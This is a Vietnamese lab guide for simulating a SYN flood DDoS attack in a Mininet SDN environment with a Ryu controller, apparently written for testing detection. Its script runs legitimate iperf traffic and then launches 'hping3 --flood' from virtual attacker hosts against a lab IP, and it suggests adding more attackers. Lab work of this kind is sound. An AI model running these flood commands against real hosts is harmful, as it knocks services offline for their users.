# ⚔️ Hướng Dẫn Kịch Bản Giả Lập Tấn Công DDoS (Mininet)

Tài liệu này hướng dẫn cách sử dụng script để giả lập tấn công **SYN Flood** trong môi trường SDN (Mininet).
Kịch bản gồm 3 bước chính:

* Khởi động Web Server
* Tạo lưu lượng truy cập hợp lệ
* Phát động tấn công

---

## 1. Chuẩn bị & Chỉnh sửa Script (`attack_scenario.sh`)

### ⚠️ Lưu ý quan trọng

Trong Mininet, nếu bạn chạy trực tiếp lệnh như `iperf` hoặc `hping3`, chúng sẽ chạy trên **máy thật (host Ubuntu)** thay vì **host ảo trong Mininet**.

👉 Vì vậy, cần thêm **tên host (ví dụ: `h_web1`, `h_ext1`, `h_att1`) vào trước mỗi lệnh** để Mininet thực thi đúng.

---

### 📄 Tạo file script

Tạo file `attack_scenario.sh` (đặt cùng thư mục với file topology `.py`) và dán nội dung sau:

```bash
#!/bin/bash
# Kịch bản giả lập tấn công DDoS trong Mininet
# Chạy bằng lệnh: mininet> source attack_scenario.sh

DES_IP="10.0.2.10"

echo "[1] Khoi dong Web Server tren h_web1 (background)..."
h_web1 iperf -s -p 80 &
sleep 2

echo "[2] Client hop le (h_ext1) dang truy cap Web..."
h_ext1 iperf -c $DES_IP -p 80 -t 300 &
sleep 10 

echo "[3] Attacker (h_att1) bat dau SYN Flood!"
h_att1 hping3 -S -p 80 --flood $DES_IP &

# (Optional) Bat DDoS manh hon:
# h_att2 hping3 -S -p 80 --flood $DES_IP &
```

---

## 2. Cách chạy kịch bản

⚠️ **Không chạy bằng `bash attack_scenario.sh` ngoài terminal.**
Script phải được chạy **bên trong Mininet CLI**.

---

### 🔹 Bước 1: Khởi động Ryu Controller

Mở Terminal 1:

```bash
ryu-manager <ten_file_controller>.py
```

---

### 🔹 Bước 2: Khởi động Mininet

Mở Terminal 2:

```bash
sudo mn -c
sudo python <ten_file_topology>.py
```

---

### 🔹 Bước 3: Chạy kịch bản

Trong giao diện `mininet>`:

```bash
source attack_scenario.sh
```

---

## 3. Dấu hiệu chạy thành công

Sau khi chạy, bạn sẽ thấy:

1. ✅ Web Server (`h_web1`) chạy ở port 80
2. ✅ Client hợp lệ (`h_ext1`) gửi/nhận dữ liệu bình thường
3. ⚠️ Attacker (`h_att1`) bắt đầu SYN Flood

👉 Nếu mở Terminal của Ryu Controller, bạn sẽ thấy:

* Lưu lượng tăng đột biến
* Hệ thống detection (nếu có) bắt đầu cảnh báo

---

## 4. Ghi chú thêm

* Có thể mở rộng thành DDoS bằng nhiều attacker (`h_att2`, `h_att3`, ...)
* Có thể thay `iperf` bằng HTTP server thật (Apache/Nginx) nếu cần demo thực tế hơn
* Có thể thêm module phát hiện/mitigation trong controller

---
